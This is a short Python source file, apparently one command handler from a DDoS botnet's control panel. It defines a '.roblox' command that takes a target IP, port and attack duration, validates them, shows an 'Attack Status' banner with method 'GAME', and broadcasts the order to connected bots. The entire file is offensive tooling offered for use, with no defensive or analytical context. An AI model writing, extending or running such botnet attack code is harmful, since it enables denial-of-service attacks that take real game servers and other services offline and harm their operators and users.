from colorama import Fore

def roblox(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                            send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                            send(client, f"{Fore.LIGHTWHITE_EX}I{Fore.CYAN}P{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{ip}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Po{Fore.CYAN}rt{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{port}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                            send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}GAME")
                            broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .roblox [IP] [PORT] [TIME]')